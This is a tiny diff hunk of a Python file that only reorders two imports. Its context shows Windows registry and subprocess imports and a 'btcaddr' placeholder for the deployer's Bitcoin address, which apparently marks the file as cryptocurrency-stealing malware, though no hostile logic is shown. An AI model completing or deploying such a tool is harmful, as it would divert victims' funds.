@@ -2,8 +2,8 @@ import subprocess
 import winreg
 import shutil
 import time
-import re
 import sys
+import re
 import os
 
 btcaddr = "SET BTC ADDRESS HERE"  # if no BTC address leave as SET BTC ADDRESS HERE
